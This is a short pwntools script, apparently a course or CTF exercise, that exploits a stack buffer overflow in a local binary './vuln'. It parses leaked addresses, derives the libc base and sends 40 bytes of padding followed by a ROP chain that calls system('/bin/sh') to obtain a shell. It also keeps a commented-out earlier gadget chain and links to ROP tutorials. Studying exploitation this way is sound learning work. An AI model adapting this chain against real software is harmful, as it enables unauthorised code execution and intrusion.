from pwn import *
context(os='linux',arch='amd64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
e = ELF('./vuln')
#p = gdb.debug('./vuln')
p = process('./vuln')
# Reading the leaked addresses
stack = p.recvline().split(b' ')[-1].strip()
system = p.recvline().split(b' ')[-1].strip()
printf = p.recvline().split(b' ')[-1].strip()
# Converting the addresses to integers
integer_printf = int(printf, 16)
# Fill the buffer with junk
junk = b'A'*40
# Calculating the base address of libc
libc_base = int(system, 16) - 0x52290
libc.address = libc_base
# Creating the ROP chain
rp = ROP(libc)
rp.call('puts', [0x40202d])
rp.call('system', [next(libc.search(b'/bin/sh\x00'))])
rp.call('exit', [0])
print(rp.dump())
# Sending the payload
p.sendline(junk + rp.chain())
p.interactive()


"""
puts = libc_base + 0x0000000000084420
junk = b'A'*40
s = p64(0x40202d)
gad = p64(0x0000000000401313)
p.sendline(junk + gad + s + p64(puts))
print(p.recvall())
#https://tc.gts3.org/cs6265/tut/tut06-01-rop.html
"""
# https://nikhilh20.medium.com/return-oriented-programming-rop-chaining-def0677923ad